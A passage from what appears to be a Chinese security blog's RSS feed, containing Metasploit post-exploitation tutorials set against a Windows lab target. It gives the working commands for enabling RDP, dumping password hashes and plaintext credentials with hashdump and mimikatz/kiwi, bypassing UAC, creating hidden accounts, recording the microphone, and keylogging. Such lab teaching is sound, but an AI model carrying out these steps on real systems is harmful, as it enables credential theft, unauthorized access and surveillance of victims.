            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;h4 id=&#34;1-rdesktop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-rdesktop&#34;&gt;#&lt;/a&gt; 1 rdesktop&lt;/h4&gt;
&lt;p&gt;在线安装  rdesktop&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Debian,Ubuntu,kali 下使用以下命令&lt;/p&gt;
&lt;p&gt;apt-get install rdesktop&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Centos/RedHat 可以通过 yum 命令&lt;/p&gt;
&lt;p&gt;yum -y install rdesktop&lt;/p&gt;
&lt;h4 id=&#34;2-一台windiows靶机没有物理电脑可以使用虚拟机代替&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-一台windiows靶机没有物理电脑可以使用虚拟机代替&#34;&gt;#&lt;/a&gt; 2 一台 windiows 靶机（没有物理电脑可以使用虚拟机代替）&lt;/h4&gt;
&lt;h4 id=&#34;3-msf-metasploit-framework&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-msf-metasploit-framework&#34;&gt;#&lt;/a&gt; 3 MSF-Metasploit Framework&lt;/h4&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;1 使用 rdesktop 远程控制&lt;/p&gt;
&lt;p&gt;说明：rdesktop 是 linux 下支持 Windows 远程桌面连接的客户端程序，在 linux 系统下可通过它远程访问 Windows 桌面，支持多种版本。rdesktop 是 sourceforge 下支持 GPL 协议的一个开源项目，采用 RDP（Remote Desktop Protocol, 远程桌面协议），几乎可以连接 windows 的所有版本&lt;/p&gt;
&lt;p&gt;rdesktop 常用参数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-u&lt;/td&gt;
&lt;td&gt;账户名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-a 16&lt;/td&gt;
&lt;td&gt;指使用 16 位色显示远程画面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;全屏模式（用&lt;strong&gt; Ctrl+Alt+Enter&lt;/strong&gt; 组合键退出全屏）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-g&lt;/td&gt;
&lt;td&gt;设置分辨率 如 :   -g 1024x768&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;rdesktop -h&lt;/td&gt;
&lt;td&gt;查看 rdesktop 使用帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;rdesktop -u 用户名 -p  密码  -f   IP&lt;/p&gt;
&lt;p&gt;rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24&lt;/p&gt;
&lt;p&gt;如果远程计算机没有启动远程功能我们可以在 meterpreter 中输入&lt;/p&gt;
&lt;p&gt;启动远程桌面协议：run post/windows/manage/enable_rdp&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;2 通过 vnc 远程&lt;/p&gt;
&lt;p&gt;![1644493726723](26 后渗透远程控制.assets/1644493726723.png)&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/</guid>
            <title>后渗透之获取登陆账号密码Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:29:57 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;首先获得一个有 SYSTEM 权限的 meterpreter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png&#34; alt=&#34;1644493974746&#34; /&gt;&lt;/p&gt;
&lt;p&gt;1 抓取自动登录账户密码&lt;/p&gt;
&lt;p&gt;2 导出 SAM 数据库本地账户密码文件&lt;/p&gt;
&lt;p&gt;3 导出密码哈希&lt;/p&gt;
&lt;p&gt;4 使用 kiwi 模块获取&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码&lt;/p&gt;
&lt;p&gt;run windows/gather/credentials/windows_autologin&lt;/p&gt;
&lt;p&gt;如果提示这证明本机并没有配置自动登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png&#34; alt=&#34;1644493985741&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2  还可以通过导出 SAM 数据库中的本地用户账号（注意需要提权到 SYSTEM）&lt;/p&gt;
&lt;p&gt;run post/windows/gather/smart_hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png&#34; alt=&#34;1644493996549&#34; /&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;用户名&lt;/th&gt;
&lt;th&gt;SID&lt;/th&gt;
&lt;th&gt;LM 哈希:&lt;/th&gt;
&lt;th&gt;NTLM 哈希 1:::&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mb&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;aad3b435b51404eeaad3b435b51404ee&lt;/td&gt;
&lt;td&gt;32ed87bdb5fdc5e9cba88547376818d4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png&#34; alt=&#34;1644494007420&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3  使用  hashdump 获取密码（注意需要提权到 SYSTEM 才能使用）&lt;/p&gt;
&lt;p&gt;终端内输入  run hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png&#34; alt=&#34;1644494019182&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用在线解析工具  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY21kNS5jb20v&#34;&gt;https://www.cmd5.com/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;NTLM 哈希 例子：32ed87bdb5fdc5e9cba88547376818d4&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png&#34; alt=&#34;1644494029236&#34; /&gt;&lt;/p&gt;
&lt;p&gt;4  使用 load kiwi（使用 kiwi 模块需要 system 权限）&lt;/p&gt;
&lt;p&gt;kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能， mimikatz 的命令直接在 kiwi_cmd 里直接使用&lt;/p&gt;
&lt;p&gt;5.1 终端输入  load kiwi&lt;/p&gt;
&lt;p&gt;5.2 creds_all  直接获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png&#34; alt=&#34;1644494040171&#34; /&gt;&lt;/p&gt;
&lt;p&gt;5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png&#34; alt=&#34;1644494050257&#34; /&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;kiwi 参数和描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;creds_all：列举所有凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;creds_kerberos：列举所有 kerberos 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;creds_msv：列举所有 msv 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;creds_ssp：列举所有 ssp 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;creds_tspkg：列举所有 tspkg 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;creds_wdigest：列举所有 wdigest 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;dcsync：通过 DCSync 检索用户帐户信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;golden_ticket_create：创建黄金票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;kerberos_ticket_list：列举 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;kerberos_ticket_purge：清除 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;kerberos_ticket_use：使用 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;lsa_dump_sam：dump 出 lsa 的 SAM&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;td&gt;lsa_dump_secrets：dump 出 lsa 的密文&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;password_change：修改密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;wifi_list：列出当前用户的 wifi 配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;wifi_list_shared：列出共享 wifi 配置文件 / 编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/</guid>
            <title>后渗透之提权Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:24:23 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png&#34; alt=&#34;1644493116225&#34; /&gt;&lt;/p&gt;
&lt;p&gt;方法一、 meterpreter 中输入：getsystem&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png&#34; alt=&#34;1644493125642&#34; /&gt;&lt;/p&gt;
&lt;p&gt;方法二、使用 msf 模块提权&lt;/p&gt;
&lt;p&gt;要想提权必须是已经拿到 meterpreter  然后将当前 meterpreter 后台 meterprerer 中输入  background&lt;/p&gt;
&lt;p&gt;1、 查看可用模块  MSF 终端中输入   search bypassuac   查看提权模块&lt;/p&gt;
&lt;p&gt;2、 选择一个适合当前系统的提权模块  我这边使用的是 win10 系统&lt;/p&gt;
&lt;p&gt;那我们使用：use  exploit/windows/local/bypassuac_windows_store_reg  尝试提权&lt;/p&gt;
&lt;p&gt;这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack&lt;/p&gt;
&lt;p&gt;或者  use exploit/windows/local/bypassuac_dotnet_profiler&lt;/p&gt;
&lt;p&gt;3 配置模块使用参数   终端内输入： show options&lt;/p&gt;
&lt;p 需要提权的session=&#34;&#34; id=&#34;&#34;&gt;4 可以看到需要配置 session  终端内输入：set session &lt;/p&gt;
&lt;p&gt;5 执行提权  终端内输入：run&lt;/p&gt;
&lt;p&gt;6 获取到 meterpreter 后 我们在终端内 输入 getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限&lt;/p&gt;
&lt;p&gt;7 获取权限完成后 输入 getuid 即可看到  已经获取到 SYSTEM 最高权限了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png&#34; alt=&#34;1644493163472&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到这个证明已经将权限提升成功&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/</guid>
            <title>后渗透之调用音频设备录音</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/</link>
            <pubDate>Thu, 12 Jan 2023 21:20:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;一、环境准备&lt;br /&gt;
 MSF-Metasploit Framework&lt;br /&gt;
 一台安装手机或者模拟器&lt;br /&gt;
二、实践&lt;/p&gt;
&lt;p&gt;record_mic  包含 4 个可选参数 分别为&lt;/p&gt;
&lt;p&gt;-d  是设置录音时长的&lt;/p&gt;
&lt;p&gt;-f 设置未见路径的&lt;/p&gt;
&lt;p&gt;-h  查看帮助的&lt;/p&gt;
&lt;p&gt;-p  控制自动播放的&lt;/p&gt;
&lt;p&gt;一条简单的录音语句&lt;/p&gt;
&lt;p&gt;record_mic -d  10 -p true&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/</guid>
            <title>后渗透之创建账户Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:17:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;一、环境准备&lt;/p&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台获取到 meterpreter 的靶机&lt;/p&gt;
&lt;p&gt;二、实际操作&lt;/p&gt;
&lt;p&gt;1、先看下目标靶机已存在用户  meterpreter 中输入：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
&lt;p&gt;![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png)&lt;/p&gt;
&lt;p&gt;2、使用 getgui 创建 一个用户名为 msb  密码为 123456  的账户&lt;/p&gt;
&lt;p&gt;run getgui -u msb -p 123456&lt;/p&gt;
&lt;p 密码=&#34;&#34;&gt;run getgui -u {用户名}-p&lt;/p&gt;
&lt;p&gt;进入 win 的运行输入 netplwiz 可以查看账户创建情况&lt;/p&gt;
&lt;p&gt;![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)&lt;/p&gt;
&lt;p&gt;[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到 system）&lt;/p&gt;
&lt;p&gt;2.1 绕过 UAC 提权&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/&lt;em&gt;ask&lt;/em&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</guid>
            <title>后渗透之下载文件屏幕截图键盘记录</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Thu, 12 Jan 2023 21:08:41 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;第 21 课 ：后渗透之上传下载文件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td&gt;upload&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;传文件到靶机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td&gt;download&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;从靶机下载文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;第 22 课：后渗透之屏幕截图&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;screenshot&lt;/td&gt;
&lt;td&gt;截图（Windows）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;第 23 课：后渗透之键盘记录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Conmmand&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;keyscan_start&lt;/td&gt;
&lt;td&gt;启动键盘记录 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;keyscan_dump&lt;/td&gt;
&lt;td&gt;导出键盘 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;keyscan_stop&lt;/td&gt;
&lt;td&gt;停止键盘记录 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
    </channel>
</rss>
